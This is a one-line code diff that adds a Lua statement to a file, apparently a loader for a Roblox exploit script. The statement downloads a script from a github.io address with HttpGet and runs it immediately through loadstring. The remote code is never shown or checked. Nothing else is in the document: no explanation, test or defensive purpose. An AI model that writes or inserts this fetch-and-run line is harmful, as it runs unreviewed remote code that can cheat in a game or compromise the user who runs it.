@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://nyulalol.github.io/release/main.lua"))()
